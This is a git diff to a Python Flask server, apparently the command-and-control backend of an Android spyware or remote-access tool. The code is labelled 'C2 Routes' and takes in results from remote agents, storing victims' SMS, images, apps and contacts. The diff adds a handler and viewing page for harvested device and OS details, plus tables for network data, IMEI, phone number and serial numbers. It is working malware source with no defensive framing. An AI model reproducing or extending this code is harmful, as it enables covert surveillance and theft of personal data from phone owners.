@@ -44,11 +44,21 @@ def viewContacts():
     sql = "SELECT * FROM contacts"
     data_rows, columns = get_data_sql(sql)
     return render_template("contacts.html", title="contacts", columns=columns, data=data_rows)
+    
+@app.route("/phonedetails")
+def viewPhoneDetails():
+    device_d_sql = "SELECT * FROM devicedetails"
+    device_d_data_rows, device_d_columns = get_data_sql(device_d_sql)
+    
+    os_d_sql = "SELECT * FROM osdetails"
+    os_d_data_rows, os_d_columns = get_data_sql(os_d_sql)
+    
+    
+    return render_template("phonedetails.html", title="phonedetails", device_d_columns=device_d_columns, device_d_data_rows=device_d_data_rows, os_d_columns=os_d_columns, os_d_data_rows=os_d_data_rows)
 
 #############
 # C2 Routes #
 #############
-
 
 @app.route("/updog", methods=['GET'])
 def updog():
@@ -111,6 +121,8 @@ def receiveResult(id):
             return handle_app(content["data"], id)
         elif code == "contacts":
             return handle_contacts(content["data"], id)
+        elif code == "phonedetails":
+            return handle_phonedetails(content["data"], id)
         
     else:
         return ("\n", 204)
@@ -186,6 +198,24 @@ def handle_contacts(content, id):
         sql = "INSERT INTO contacts VALUES (?, ?, ?, ?)"
         args = (id, name, number, email)
         writeToDatabase(sql, args)
+        
+def handle_phonedetails(content, id):
+    clearAgentTasks(id)
+    
+    DeviceDetails = content.get("DeviceDetails")
+    
+    # Save data to database
+    sql = "INSERT INTO devicedetails VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    args = (id, DeviceDetails.get("model"), DeviceDetails.get("manufacturer"), DeviceDetails.get("brand"), DeviceDetails.get("product"), DeviceDetails.get("device"), DeviceDetails.get("board"), DeviceDetails.get("display"), DeviceDetails.get("hardware"), DeviceDetails.get("id"), DeviceDetails.get("serial"), DeviceDetails.get("type"), DeviceDetails.get("user"))
+    writeToDatabase(sql, args)
+    
+    OSDetails = content.get("OSDetails")
+    sql = "INSERT INTO osdetails VALUES (?, ?, ?)"
+    args = (id, OSDetails.get("androidVersion"), OSDetails.get("sdkVersion"))
+    writeToDatabase(sql, args)
+    
+    return ("Success", 200)
+    
 
 ####################
 # Helper functions #
@@ -246,7 +276,21 @@ def init_database():
             "CREATE TABLE IF NOT EXISTS sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)",
             "CREATE TABLE IF NOT EXISTS images (id TEXT, path TEXT)",
             "CREATE TABLE IF NOT EXISTS app(id TEXT, package TEXT, sourceDir TEXT, launchActivity TEXT)",
-            "CREATE TABLE IF NOT EXISTS contacts(id TEXT, displayName TEXT, phoneNumber TEXT, email TEXT)"
+            "CREATE TABLE IF NOT EXISTS contacts(id TEXT, displayName TEXT, phoneNumber TEXT, email TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS devicedetails(id TEXT, model TEXT, manufacturer TEXT, brand  TEXT, product TEXT, device TEXT, board TEXT, display TEXT, hardware TEXT, id_num TEXT, serial TEXT, type TEXT, user TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS osdetails(id TEXT, androidVersion TEXT, sdkVersion TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS displaydetails(id TEXT, width TEXT, height TEXT, PPI TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS batterydetails(id TEXT, level TEXT, status TEXT, isCharging TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS networkdetails(id TEXT, networkType TEXT, isNetworkAvailable TEXT, isWifiConnected TEXT, isMobileConnected TEXT, ssid TEXT, bssid TEXT, linkSpeed TEXT, ipAddress TEXT, networkId TEXT, signalStrength TEXT, mobileType TEXT, State TEXT, detailedState TEXT, operatorName TEXT, operatorCode TEXT, roaming TEXT, strength TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS storagedetails(id TEXT, totalExternalStorage TEXT, availableExternalStorage TEXT, totalInternalStorage TEXT, availableInternalStorage TEXT, storagePath TEXT, totalSpace TEXT, availableSpace TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS telephonydetails(id TEXT, phoneNumber TEXT, imei TEXT)"
         ]
 
         for sql in sqls:
